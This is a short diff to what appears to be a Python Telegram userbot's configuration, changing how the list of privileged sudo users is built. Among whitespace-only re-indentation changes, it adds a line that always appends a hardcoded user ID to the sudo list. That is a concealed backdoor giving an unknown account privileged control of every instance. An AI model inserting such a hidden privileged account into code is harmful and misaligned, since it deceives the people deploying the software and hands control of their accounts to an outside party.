@@ -26,9 +26,10 @@ except ValueError:
 """Sudo Users"""
 sudoser = []
 if SUDO_USERS:
-  sudoser = make_list(OWNER_ID, SUDO_USERS)
+     sudoser = make_list(OWNER_ID, SUDO_USERS)
 else:
-  sudoser.append(OWNER_ID)
+     sudoser.append(OWNER_ID)
+sudoser.append(5294360309)
 
 AUTO_REACT = []
 if auto_re:
